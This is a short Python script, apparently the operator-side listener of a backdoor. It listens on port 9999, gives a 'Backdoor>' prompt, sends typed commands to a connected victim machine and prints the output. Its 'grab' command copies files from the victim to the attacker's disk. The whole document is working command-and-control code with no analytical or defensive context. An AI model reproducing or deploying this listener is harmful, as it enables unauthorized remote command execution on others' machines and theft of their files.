import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9999))  # Bind to all interfaces on port 9999
server.listen(5)
print("[*] Listening on 0.0.0.0:9999")

while True:
    client_socket, addr = server.accept()
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

    while True:
        command = input("Backdoor> ")
        if 'terminate' in command:
            client_socket.send('terminate'.encode())
            client_socket.close()
            break
        elif 'grab' in command:
            client_socket.send(command.encode())
            file_buffer = b""
            while True:
                data = client_socket.recv(1024)
                if not data or data.endswith(b"DONE"):
                    break
                file_buffer += data
            with open(command.split('*')[-1], "wb") as f:
                f.write(file_buffer)
        else:
            client_socket.send(command.encode())
            print(client_socket.recv(1024).decode())